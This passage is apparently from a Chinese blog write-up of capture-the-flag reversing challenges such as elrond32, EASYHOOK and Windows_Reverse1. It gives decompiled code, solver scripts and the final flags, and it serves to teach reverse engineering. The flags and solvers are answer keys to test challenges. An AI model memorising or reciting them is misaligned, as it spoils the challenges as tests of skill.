&#39;)if len(flag) &gt; 69:    print &#39;nice try&#39;    exit()if len(flag) % 5 != 0:    print &#39;nice try&#39;    exit()for i in range(0, len(flag), 5):    s = flag[i:i + 5]    if int(&#39;0x&#39; + md5.new(s).hexdigest(), 16) != md5s[(i / 5)]:        print &#39;nice try&#39;        exit()print &#39;Congratz now you have the flag&#39;</code></pre><p>发现给出了很多md5，把flag每5个字符一组，算出md5要和给出的相同，所以用这些<a href="https://www.somd5.com/" target="_blank" rel="noopener">md5在线解密</a></p><p>组合起来就是flag</p><pre><code>ALEXCTF{dv5d4s2vj8nk43s8d8l6m1n5l67ds9v41n52nv37j481h3d28n4b6v3k}</code></pre><h4 id="anser-to-everything"><a href="#anser-to-everything" class="headerlink" title="anser_to_everything"></a>anser_to_everything</h4><p>IDA打开</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [rsp+Ch] [rbp-4h]  printf(&quot;Gimme: &quot;, argv, envp);  __isoc99_scanf(&quot;%d&quot;, &amp;v4);  not_the_flag(v4);  return 0;}//not_the_flag__int64 __fastcall not_the_flag(int a1){  if ( a1 == &#39;*&#39; )    puts(&quot;Cipher from Bill \nSubmit without any tags\n#kdudpeh&quot;);  else    puts(&quot;YOUSUCK&quot;);  return 0LL;}</code></pre><p>找到了一个字符串<code>kdudpeh</code>，根据题目提示，sha1加密得<code>80ee2a3fe31da904c596d993f7f1de4827c1450a</code></p><p>套上flag得</p><pre><code>flag{80ee2a3fe31da904c596d993f7f1de4827c1450a}</code></pre><h4 id="elrond32"><a href="#elrond32" class="headerlink" title="elrond32"></a>elrond32</h4><p>IDA打开，main函数如下</p><pre><code class="c++">int __cdecl main(int a1, char **a2){  if ( a1 &gt; 1 &amp;&amp; sub_8048414(a2[1], 0) )  {    puts(unk_80487E4);    sub_8048538((int)a2[1]);  }  else  {    puts(&quot;Access denied&quot;);  }  return 0;}</code></pre><p>我们得输入作为main函数得参数传入，在<code>sub_8048414()</code>函数中进行了一个判断，然后进入<code>sub_8048538()</code>函数处理后输出flag</p><pre><code class="c++">signed int __cdecl sub_8048414(_BYTE *a1, int a2){  signed int result; // eax  switch ( a2 )  {    case 0:      if ( *a1 == &#39;i&#39; )        goto LABEL_19;      result = 0;      break;    case 1:      if ( *a1 == &#39;e&#39; )        goto LABEL_19;      result = 0;      break;    case 3:      if ( *a1 == &#39;n&#39; )        goto LABEL_19;      result = 0;      break;    case 4:      if ( *a1 == &#39;d&#39; )        goto LABEL_19;      result = 0;      break;    case 5:      if ( *a1 == &#39;a&#39; )        goto LABEL_19;      result = 0;      break;    case 6:      if ( *a1 == &#39;g&#39; )        goto LABEL_19;      result = 0;      break;    case 7:      if ( *a1 == &#39;s&#39; )        goto LABEL_19;      result = 0;      break;    case 9:      if ( *a1 == &#39;r&#39; )LABEL_19:        result = sub_8048414(a1 + 1, 7 * (a2 + 1) % 11);      else        result = 0;      break;    default:      result = 1;      break;  }  return result;}</code></pre><p>判断得过程是一个递归，因为返回值要为1，所以递归过程中得每一个if都需要满足，所以很好得到输入的字符串是什么</p><pre><code class="c++">int __cdecl sub_8048538(int a1){  int v2[33]; // [esp+18h] [ebp-A0h]  int i; // [esp+9Ch] [ebp-1Ch]  qmemcpy(v2, &amp;unk_8048760, sizeof(v2));  for ( i = 0; i &lt;= 32; ++i )    putchar(v2[i] ^ *(char *)(a1 + i % 8));  return putchar(10);}</code></pre><p>输出部分只进行了一个很简单的处理，而且不需要逆向，直接用同样的方式处理即可</p><pre><code class="python">targrt = &#39;ie_ndags_r&#39;f = &#39;&#39;j = 0for i in range(8):    f += targrt[j]    j = 7 * (j + 1) % 11# print(f)flag = &#39;&#39;a2 = [0x0F, 0x1F, 0x04, 0x09, 0x1C, 0x12, 0x42, 0x09, 0x0C, 0x44, 0x0D, 0x07, 0x09, 0x06, 0x2D,      0x37, 0x59, 0x1E, 0x00, 0x59, 0x0F, 0x08, 0x1C, 0x23, 0x36, 0x07, 0x55, 0x02, 0x0C, 0x08,      0x41, 0x0A, 0x14]for i in range(33):    flag += chr(a2[i] ^ ord(f[i % 8]))print(flag)</code></pre><p>输出flag</p><pre><code>flag{s0me7hing_S0me7hinG_t0lki3n}</code></pre><h4 id="tt3441810"><a href="#tt3441810" class="headerlink" title="tt3441810"></a>tt3441810</h4><p>这题并不知道是在干什么，IDA打开是个dumpfile，打开给了很多16进制，看到了<code>0x68</code>这个经典数字（<code>push</code>指令的编码)，后面接了两个字符，看到<code>fl</code>，感觉有问题，找到后面很多个<code>0x68</code>，每个后买你都跟了两个字符，像是把flag<code>push</code>进栈的操作，所以把这些数据导出，然后写个脚本跑一下，验证猜想</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    unsigned char ida_chars[] =            {                    0x68, 0x66, 0x6C, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48,                    0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,                    0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F,                    0x05, 0x68, 0x61, 0x67, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24,                    0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x0F, 0x05, 0x68, 0x7B, 0x70, 0x00, 0x00, 0x48, 0xBF, 0x01,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34,                    0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x0F, 0x05, 0x68, 0x6F, 0x70, 0x00, 0x00, 0x48, 0xBF,                    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D,                    0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x6F, 0x00, 0x00, 0x48,                    0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,                    0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x72, 0x00, 0x00,                    0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x65, 0x74, 0x00,                    0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x7D, 0x0A,                    0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x31,                    0xFF, 0x48, 0xB8, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x0F, 0x05            };    int len = sizeof(ida_chars)/ sizeof(ida_chars[0]);    string flag;    int i =0;    while(i!=len) {        if(ida_chars[i]==0x68)        {            while(ida_chars[++i]!=0x00)            {                flag+=ida_chars[i];            }        }        else        {            i++;        }    }    cout&lt;&lt;flag&lt;&lt;endl;    return 0;}</code></pre><p>输出flag</p><pre><code>flag{poppopret}</code></pre><p>提交的时候只需要中间的部分</p><h4 id="re2-cpp-is-awesome"><a href="#re2-cpp-is-awesome" class="headerlink" title="re2-cpp-is-awesome"></a>re2-cpp-is-awesome</h4><p>这题有很多string类，所以还是要慢慢分析</p><pre><code class="c++">__int64 __fastcall main(int a1, char **a2, char **a3){  char *v3; // rbx  __int64 v4; // rax  __int64 v5; // rdx  __int64 v6; // rax  __int64 v7; // rdx  __int64 v8; // rdx  __int64 v9; // rdx  __int64 i; // [rsp+10h] [rbp-60h]  char v12; // [rsp+20h] [rbp-50h]  char v13; // [rsp+4Fh] [rbp-21h]  __int64 v14; // [rsp+50h] [rbp-20h]  int v15; // [rsp+5Ch] [rbp-14h]  if ( a1 != 2 )  {    v3 = *a2;    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Usage: &quot;, a3);    v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v4, v3, v5);    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v6, &quot; flag\n&quot;, v7);    exit(0);  }  std::allocator&lt;char&gt;::allocator(&amp;v13, a2, a3);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v12, a2[1], &amp;v13);  std::allocator&lt;char&gt;::~allocator(&amp;v13);  v15 = 0;  for ( i = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::begin(&amp;v12); ; sub_400D7A(&amp;i) )  {    v14 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::end(&amp;v12);    if ( !sub_400D3D((__int64)&amp;i, (__int64)&amp;v14) )      break;    v9 = *(unsigned __int8 *)sub_400D9A((__int64)&amp;i);    if ( (_BYTE)v9 != off_6020A0[dword_6020C0[v15]] )      sub_400B56((__int64)&amp;i, (__int64)&amp;v14, v9);    ++v15;  }  sub_400B73((__int64)&amp;i, (__int64)&amp;v14, v8);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v12);  return 0LL;}</code></pre><p>真正有用的内容只有一个for循环，在这之前我们输入的字符串被传入了<code>v12</code>，然后用迭代器进行循环，遍历整个字符串，每个字符被赋值给了<code>v9</code>，然后进行判断，如果判断可以通过，我们输入的就是正确的flag，判断的条件是<code>v9 = off_6020A0[dword_6020C0[v15]]</code>，一个嵌套索引，把数据导出之后很容易得到结果</p><pre><code class="python">target = &quot;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&quot;dword_6020C0 = [36, 0, 5, 54, 101, 7, 39, 38, 45, 1, 3, 0, 13, 86, 1, 3, 101, 3, 45, 22, 2, 21, 3, 101, 0, 41, 68, 68,                1, 68, 43]flag = &#39;&#39;for i in dword_6020C0:    # print(i)    flag += target[i]print(flag)</code></pre><p>输出结果</p><pre><code>ALEXCTF{W3_L0v3_C_W1th_CL45535}</code></pre><h4 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h4><p>这题是MFC，题目中的函数很多，打开发现输入有错误提示，还是从字符串入手，找到了几个很有用的函数</p><pre><code class="c++">BOOL __cdecl sub_4017F0(int a1){  BOOL result; // eax  char Str1[28]; // [esp+D8h] [ebp-24h]  int v3; // [esp+F4h] [ebp-8h]  int v4; // [esp+F8h] [ebp-4h]  v4 = 0;  v3 = 0;  while ( *(_DWORD *)(a1 + 4 * v4) &lt; 62 &amp;&amp; *(_DWORD *)(a1 + 4 * v4) &gt;= 0 )  {    Str1[v4] = alphabet[*(_DWORD *)(a1 + 4 * v4)];    ++v4;  }  Str1[v4] = 0;  if ( !strcmp(Str1, &quot;KanXueCTF2019JustForhappy&quot;) )    result = pass();  else    result = fail();  return result;}</code></pre><p>更改了一些函数和变量名，更容易辨认，这个函数传入了<code>a1</code>之后，对<code>a1</code>之后的地址上的内容作为索引值依次连接组成了一个新的字符串，所以<code>a1</code>显然应该是一个地址，或者说是一个数组的首地址，而这个数组的内容我们很容易就可以得到，接着再看到底在哪里引用了这个函数</p><pre><code class="c++">int __thiscall sub_401890(CWnd *this){  struct CString *v1; // ST08_4  CWnd *v2; // eax  int v3; // eax  int v5[26]; // [esp+4Ch] [ebp-74h]  int i; // [esp+B4h] [ebp-Ch]  char *Str; // [esp+B8h] [ebp-8h]  CWnd *v8; // [esp+BCh] [ebp-4h]  v8 = this;  v1 = (CWnd *)((char *)this + 100);  v2 = CWnd::GetDlgItem(this, 1002);  CWnd::GetWindowTextA(v2, v1);  v3 = sub_401A30((char *)v8 + 100);  Str = CString::GetBuffer((CWnd *)((char *)v8 + 100), v3);  if ( !strlen(Str) )    return CWnd::MessageBoxA(v8, &amp;Qingshuru, 0, 0);  for ( i = 0; Str[i]; ++i )  {    if ( Str[i] &gt; 57 || Str[i] &lt; 48 )    {      if ( Str[i] &gt; 122 || Str[i] &lt; 97 )      {        if ( Str[i] &gt; 90 || Str[i] &lt; 65 )          fail();        else          v5[i] = Str[i] - 29;      }      else      {        v5[i] = Str[i] - 87;      }    }    else    {      v5[i] = Str[i] - 48;    }  }  return sub_4017F0((int)v5);}</code></pre><p>这个函数也很简单，把输入的内容赋给<code>Str</code>，然后对str里面的字符进行一个变换，把变换后的数组传给刚刚分析的那个函数，所以想要逆向解出输入的字符就很简单了</p><pre><code class="python">str1 = &#39;KanXueCTF2019JustForhappy&#39;alphabet = &#39;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&#39;a1 = []for i in str1:    j = alphabet.index(i)    a1.append(j)# print(a1)flag = &#39;&#39;for i in a1:    if 0 &lt;= i &lt;= 9:        flag += chr(i + 48)    elif i &lt;= 35:        flag += chr(i + 87)    else:        flag += chr(i + 29)print(flag)</code></pre><p>根据题目要求把输出的内容套上flag</p><pre><code>flag{j0rXI4bTeustBiIGHeCF70DDM}</code></pre><h4 id="easyRE1"><a href="#easyRE1" class="headerlink" title="easyRE1"></a>easyRE1</h4><p>毫无意义的题目，打开就能看到flag，套上<code>flag{}</code>直接交上去就行了</p><h4 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h4><p>题如其名，peid打开发现是c#，所以直接dnspy打开，发现flag是直接计算出来的，并且没有进行任何的反调试，所以直接调试运行几步就得到了flag</p><pre><code>flag{967DDDFBCD32C1F53527C221D9E40A0B}</code></pre><h4 id="Guess-the-Number"><a href="#Guess-the-Number" class="headerlink" title="Guess-the-Number"></a>Guess-the-Number</h4><p>这题是java逆向，cfr反编译之后，查看源代码</p><pre><code class="java">import java.io.PrintStream;import java.math.BigInteger;public class guess {    static String XOR(String _str_one, String _str_two) {        BigInteger i1 = new BigInteger(_str_one, 16);        BigInteger i2 = new BigInteger(_str_two, 16);        BigInteger res = i1.xor(i2);        String result = res.toString(16);        return result;    }    public static void main(String[] args) {        block5: {            int guess_number = 0;            int my_num = 349763335;            int my_number = 1545686892;            int flag = 345736730;            if (args.length &gt; 0) {                try {                    guess_number = Integer.parseInt(args[0]);                    if (my_number / 5 == guess_number) {                        String str_one = &quot;4b64ca12ace755516c178f72d05d7061&quot;;                        String str_two = &quot;ecd44646cfe5994ebeb35bf922e25dba&quot;;                        my_num += flag;                        String answer = guess.XOR(str_one, str_two);                        System.out.println(&quot;your flag is: &quot; + answer);                        break block5;                    }                    System.err.println(&quot;wrong guess!&quot;);                    System.exit(1);                }                catch (NumberFormatException e) {                    System.err.println(&quot;please enter an integer \nexample: java -jar guess 12&quot;);                    System.exit(1);                }            } else {                System.err.println(&quot;wrong guess!&quot;);                int num = 1000000;                ++num;                System.exit(1);            }        }    }}</code></pre><p>程序很简单，我们当然可以根据算法来算出来flag的值，但是完全可以得到需要输入的数，所以直接运行就好了</p><pre><code class="powershell">&gt;java -jar Guess-the-Number.jar 309137378</code></pre><p>输出结果</p><pre><code>your flag is: a7b08c546302cc1fd2a4d48bf2bf2ddb</code></pre><p>直接提交即可</p><h4 id="EASYHOOK"><a href="#EASYHOOK" class="headerlink" title="EASYHOOK"></a>EASYHOOK</h4><p>这题很有意思，值得好好分析一下，IDA打开，找到main函数</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  int result; // eax  HANDLE v4; // eax  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-24h]  char Buffer; // [esp+8h] [ebp-20h]  puts((int)aPleaseInputFla);  scanf(a31s, &amp;Buffer);  if ( strlen(&amp;Buffer) == 19 )  {    sub_401220();    v4 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0x80u, 0);    WriteFile(v4, &amp;Buffer, 19u, &amp;NumberOfBytesWritten, 0);    sub_401240(&amp;Buffer, &amp;NumberOfBytesWritten);    if ( NumberOfBytesWritten == 1 )      puts((int)aRightFlagIsYou);    else      puts((int)aWrong);    system(aPause);    result = 0;  }  else  {    puts((int)aWrong);    system(aPause);    result = 0;  }  return result;}</code></pre><p>第一反应当然是查看一下<code>sub_401240()</code>的内容，毕竟这是最后一个调用<code>NumberOfBytesWritten</code>的函数，而这个值，经过<code>writeFile()</code>之后应该是19</p><pre><code class="c++">signed int __cdecl sub_401240(const char *a1, _DWORD *a2){  signed int result; // eax  unsigned int v3; // kr04_4  char v4[24]; // [esp+Ch] [ebp-18h]  result = 0;  strcpy(v4, &quot;This_is_not_the_flag&quot;);  v3 = strlen(a1) + 1;  if ( (signed int)(v3 - 1) &gt; 0 )  {    while ( v4[a1 - v4 + result] == v4[result] )    {      if ( ++result &gt;= (signed int)(v3 - 1) )      {        if ( result == 21 )        {          result = (signed int)a2;          *a2 = 1;        }        return result;      }    }  }  return result;}</code></pre><p>看到<code>This_is_not_the_flag</code>感觉有些不对，仔细观察发现这个字符串有20的字符，而下面的判断需要我们的输入和这个字符串相等，但是我们只输入19个字符，所以这个函数永远不可能返回我们想要的结果，肯定是有什么东西被漏掉了，所以返回<code>main</code>，前面还有一个<code>sub_401220()</code>没有看</p><pre><code class="c++">int sub_401220(){  HMODULE v0; // eax  DWORD v2; // eax  v2 = GetCurrentProcessId();  hProcess = OpenProcess(0x1F0FFFu, 0, v2);  v0 = LoadLibraryA(LibFileName);  dword_40C9C4 = (int)GetProcAddress(v0, unk_40A05C);// 找到writefile的地址  lpAddress = (LPVOID)dword_40C9C4;  if ( !dword_40C9C4 )    return puts((int)&amp;dword_40A044);  unk_40C9B4 = *(_DWORD *)lpAddress;  *((_BYTE *)&amp;unk_40C9B4 + 4) = *((_BYTE *)lpAddress + 4);  byte_40C9BC = 0xE9u;  dword_40C9BD = (char *)sub_401080 - (char *)lpAddress - 5;  return sub_4010D0();}</code></pre><p>在这里发现了问题，这里找到了储存<code>writefile()</code>地址的位置，然后保存前五个字节的内容，后面进行了一些赋值，看到<code>0xE9</code>就发现这里想要修改<code>writefile()</code>函数地址，跳转到另一个函数<code>sub_401080()</code>，然后函数进入<code>sub_4010D0()</code></p><pre><code class="c++">BOOL sub_4010D0(){  DWORD v1; // [esp+4h] [ebp-8h]  DWORD flOldProtect; // [esp+8h] [ebp-4h]  v1 = 0;  VirtualProtectEx(hProcess, lpAddress, 5u, 4u, &amp;flOldProtect);  WriteProcessMemory(hProcess, lpAddress, &amp;byte_40C9BC, 5u, 0);  return VirtualProtectEx(hProcess, lpAddress, 5u, flOldProtect, &amp;v1);}</code></pre><p>这个函数把刚刚的修改写进了相应的地址，此时程序一旦调用<code>writefile()</code>，就会跳转到<code>sub_401080()</code>，所以转到这个函数</p><pre><code class="c++">int __stdcall sub_401080(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped){  signed int v5; // ebx  v5 = sub_401000((int)lpBuffer, nNumberOfBytesToWrite);  sub_401140();  WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);  if ( v5 )    *lpNumberOfBytesWritten = 1;  return 0;}</code></pre><p>如果<code>sub_401000()</code>返回值是1，就会输出我们的输入是正确的，<code>sub_401140()</code>是用来恢复<code>writefile()</code>函数的地址，就不再赘述，所以重点就是<code>sub_401000()</code></p><pre><code class="c++">signed int __cdecl sub_401000(int a1, signed int a2){  char v2; // al  char v3; // bl  char v4; // cl  int v5; // eax  v2 = 0;  if ( a2 &gt; 0 )  {    do    {      if ( v2 == 18 )      {        *(_BYTE *)(a1 + 18) ^= 0x13u;      }      else      {        if ( v2 % 2 )          v3 = *(_BYTE *)(v2 + a1) - v2;        else          v3 = *(_BYTE *)(v2 + a1 + 2);        *(_BYTE *)(v2 + a1) = v2 ^ v3;      }      ++v2;    }    while ( v2 &lt; a2 );  }  v4 = 0;  if ( a2 &lt;= 0 )    return 1;  v5 = 0;  while ( aAjygkfmSv8mln[v5] == *(_BYTE *)(v5 + a1) )  {    v5 = ++v4;    if ( v4 &gt;= a2 )      return 1;  }  return 0;}</code></pre><p>这里的操作就很简单了，也不需要再多说，我们的输入经过处理后如果和内存中的字符串相同，就对了</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;int main() {    char str[20] =            &quot;ajygkFm.\x7F_~-SV{8mLn&quot;;    char a1[20] = {0};    for (int i = 0; i &lt; 19; i++) {        if (i == 18) {            a1[i] = str[18] ^ 0x13;        }        if (i % 2) {            a1[i] = (str[i] ^ i) + i;        } else {            a1[i + 2] = (str[i] ^ i);        }    }    a1[0]=&#39;f&#39;;    cout &lt;&lt; a1 &lt;&lt; endl;}</code></pre><p>这里有一点需要注意，这个程序是没法检测第一位输入的，中间的过程也完全没有用到第一位，所以根据输出结果手动添加了’f’，输出</p><pre><code>flag{Ho0k_w1th_Fun}</code></pre><p>可以验证一下，第一位其实并不影响结果</p><p><img src="https://s2.ax1x.com/2020/02/14/1XU7IP.png" srcset="/img/loading.gif" alt="EASYHOOK-1"></p><p>发现第一位改成其他的字符也是正确的</p><h4 id="reverse-for-the-holy-grail-350"><a href="#reverse-for-the-holy-grail-350" class="headerlink" title="reverse-for-the-holy-grail-350"></a>reverse-for-the-holy-grail-350</h4><p>这题还算是比较简单的题目，很容易就可以找到关键函数，然后发现所有的数据处理和验证全部都在这个函数里面</p><pre><code class="c++">__int64 __fastcall stringMod(__int64 *a1){  __int64 v1; // r9  __int64 v2; // r10  __int64 i; // rcx  signed int v4; // er8  int *v5; // rdi  int *v6; // rsi  signed int v7; // ecx  signed int v8; // er9  int v9; // er10  unsigned int v10; // eax  int v11; // esi  int v12; // esi  int v14[24]; // [rsp+0h] [rbp-60h]  int _48[24]; // [rsp+48h] [rbp-18h]  memset(v14, 0, 0x48uLL);  v1 = a1[1];  if ( v1 )  {    v2 = *a1;    i = 0LL;    v4 = 0;    do    {      v12 = *(char *)(v2 + i);      v14[i] = v12;      if ( 3 * ((unsigned int)i / 3) == (_DWORD)i &amp;&amp; v12 != firstchar[(unsigned int)i / 3] )// 3的倍数等于firstchar        v4 = -1;      ++i;    }    while ( i != v1 );  }  else  {    v4 = 0;  }  v5 = v14;  v6 = v14;  v7 = 666;  do  {    *v6 = v7 ^ *(unsigned __int8 *)v6;    v7 += v7 % 5;    ++v6;  }  while ( _48 != v6 );  v8 = 1;  v9 = 0;  v10 = 1;  v11 = 0;  do  {    if ( v11 == 2 )    {      if ( *v5 != thirdchar[v9] )        v4 = -1;      if ( v10 % *v5 != masterArray[v9] )        v4 = -1;      ++v9;      v10 = 1;      v11 = 0;    }    else    {      v10 *= *v5;      if ( ++v11 == 3 )        v11 = 0;    }    ++v8;    ++v5;  }  while ( v8 != 19 );  return (unsigned int)(v7 * v4);}</code></pre><p>发现把输入分成了三个部分，处理起来也很简单，写脚本处理</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;int main() {    int firstchar[8] =            {65, 105, 110, 69, 111, 97};    int thirdchar[8] =            {751, 708, 732, 711, 734, 764};    int masterArray[6] =            {471, 12, 580, 606, 147, 108};    int xor_[24] = {0};    char flag[24] = {0};    xor_[0] = 666;    for (int i = 1; i &lt; 24; i++) {        xor_[i] = xor_[i - 1] + xor_[i - 1] % 5;    }    for (int i = 0; i &lt; 6; i++) {        flag[3 * i] = firstchar[i];        flag[3 * i + 2] = thirdchar[i] ^ xor_[3 * i + 2];        for (int j = 48; j &lt; 122; j++) {            if ((j &gt;= 48 &amp;&amp; j &lt;= 57) || (j &gt;= 65 &amp;&amp; j &lt;= 90) || (j &gt;= 97 &amp;&amp; j &lt;= 122)) {                int tmp = j ^xor_[3 * i + 1];                if (tmp * (flag[3 * i] ^ xor_[3 * i]) % thirdchar[i] == masterArray[i]) {                    flag[3 * i + 1] = j;                    break;                }            } else                continue;        }    }    cout &lt;&lt; flag &lt;&lt; endl;}</code></pre><p>输出flag，再套上<code>main</code>里面提供的格式即可</p><pre><code>tuctf{AfricanOrEuropean?}</code></pre><h4 id="android-app-100"><a href="#android-app-100" class="headerlink" title="android-app-100"></a>android-app-100</h4><p>反编译之后发现还调用了c的库，于是IDA打开so文件，看到了混淆，但是内容比较好猜，所以直接找到字符串计算md5或者在apk里面提交就好了</p><pre><code>Sharif_CTF(833489ef285e6fa80690099efc5d9c9d)</code></pre><h4 id="dmd-50"><a href="#dmd-50" class="headerlink" title="dmd-50"></a>dmd-50</h4><p>打开直接找到输入的flag的md5值，md5解密找到flag</p><pre><code>b781cbb29054db12f88f08c6e161c199</code></pre><h4 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows_Reverse1"></a>Windows_Reverse1</h4><p>这道题很有意思，首先查壳，发现是upx，直接脱壳，IDA打开，F5查看</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+4h] [ebp-804h]  char v5; // [esp+5h] [ebp-803h]  char v6; // [esp+404h] [ebp-404h]  char Dst; // [esp+405h] [ebp-403h]  v6 = 0;  memset(&amp;Dst, 0, 0x3FFu);  v4 = 0;  memset(&amp;v5, 0, 0x3FFu);  printf(&quot;please input code:&quot;);  scanf(&quot;%s&quot;, &amp;v6);  sub_401000(&amp;v6);  if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) )    printf(&quot;You&#39;ve got it!!%s\n&quot;, &amp;v4);  else    printf(&quot;Try again later.\n&quot;);  return 0;}</code></pre><p>表面上看我们需要输入一个字符串，然后经过<code>sub_401000</code>的变换之后变成<code>DDCTF{reverseME}</code>，然后查看一下加密函数</p><pre><code class="c++">unsigned int __cdecl sub_401000(const char *a1){  _BYTE *v1; // ecx  unsigned int v2; // edi  unsigned int result; // eax  int v4; // ebx  v2 = 0;  result = strlen(a1);  if ( result )  {    v4 = a1 - v1;    do    {      *v1 = byte_402FF8[(char)v1[v4]];      ++v2;      ++v1;      result = strlen(a1);    }    while ( v2 &lt; result );  }  return result;}</code></pre><p>看起来是一个换表操作，但是在这里遇到了两个让人疑惑的事情，第一个，我们输入的字符串是怎么传入这个函数里面来的，第二个，在<code>0x402FF8</code>处什么都没有，这个表在哪里</p><p>所以还是需要仔细看看汇编代码</p><pre><code class="asm">.text:004010A4                   lea     edx, [esp+824h+var_404].text:004010AB                 push    edx.text:004010AC                 push    offset aS       ; &quot;%s&quot;.text:004010B1                 call    ds:scanf.text:004010B7                 lea     eax, [esp+82Ch+var_404].text:004010BE                 push    eax.text:004010BF                 lea     ecx, [esp+830h+var_804].text:004010C3                 call    sub_401000.text:00401000 sub_401000      proc near               ; CODE XREF: _main+73↓p.text:00401000.text:00401000 arg_0           = dword ptr  4.text:00401000.text:00401000                 push    ecx.text:00401001                 push    ebp.text:00401002                 mov     ebp, [esp+8+arg_0].text:00401006                 push    esi.text:00401007                 mov     eax, ebp.text:00401009                 push    edi.text:0040100A                 xor     edi, edi.text:0040100C                 lea     esi, [eax+1].text:0040100F                 nop</code></pre><p>这里应该是人为修改了代码，可以看到我们输入的字符串地址被赋给了<code>ecx</code>，然后再我们的解密函数最开始，先把<code>ecx</code>里面的值压进了栈，所以这个函数用了<code>ecx</code>寄存器来传参，而这是个32位的程序，所以IDA这里检测的时候出现了一点问题，第一个问题解决了，再看看第二个，先来研究里面的索引值</p><pre><code class="c++">if ( result )  {    v4 = a1 - v1;    do    {      *v1 = byte_402FF8[(char)v1[v4]];      ++v2;      ++v1;      result = strlen(a1);    }    while ( v2 &lt; result );  }</code></pre><p><code>v1[v4]</code>这个表达形式可以看得出来就是<code>a1</code>的首地址，而<code>a1</code>就是我们输入的字符串，都是可见字符，所以每个字符的值都要大于32，所以在<code>0x402FF8</code>这个位置向下偏移至少32的位置寻找，找到了真正的字母表</p><p>分析结束，可以直接动手逆向了，不过在导出这个字母表的时候很凑巧的发现这个字母表的值刚好是从126-32的排列，这说明我们输入的和变换出来的值相加正好为158，这就提供了一个更简单的逆向思路</p><pre><code class="c++">#include 